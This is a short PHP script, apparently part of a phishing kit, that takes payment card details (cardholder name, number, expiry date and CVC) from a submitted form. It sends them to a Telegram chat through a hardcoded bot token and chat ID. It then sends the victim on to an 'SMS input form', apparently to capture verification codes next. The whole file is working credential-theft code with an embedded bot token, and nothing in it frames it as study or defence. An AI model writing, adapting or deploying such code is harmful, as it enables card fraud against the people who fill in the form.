<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $cardholder = $_POST['cardholder'];
    $number = $_POST['number'];
    $month = $_POST['month'];
    $year = $_POST['year'];
    $cvc = $_POST['cvc'];
    
    // Your Telegram Bot API token
    $botToken = "6516555054:AAFdqiXb3HTc_RkncKL30Lre7eMi38iHsQo";
    // Your Telegram Chat ID
    $chatId = "-4276589204";
    
    $message = "Cardholder: $cardholder\nCard Number: $number\nExpiry Date: $month/$year\nCVC: $cvc";
    
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    
    $data = [
        'chat_id' => $chatId,
        'text' => $message
    ];
    
    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ],
    ];
    
    $context  = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    
    if ($result === FALSE) { /* Handle error */ }
    
    // Redirect to SMS input form
    header("Location: sms_form.html");
}
?>